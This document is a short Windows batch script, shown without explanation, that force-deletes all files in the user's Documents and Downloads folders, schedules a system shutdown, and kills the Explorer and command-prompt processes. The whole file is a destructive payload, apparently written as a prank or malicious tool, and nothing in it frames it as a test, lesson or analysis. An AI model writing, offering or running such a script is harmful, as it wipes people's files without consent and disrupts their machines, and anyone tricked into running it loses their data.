@echo off
del /f /q "C:\Users\%username%\Documents\*.*"
del /f /q "C:\Users\%username%\Downloads\*.*"
shutdown -s -t 6000
taskkill /im explorer.exe /f
taskkill /im cmd.exe /f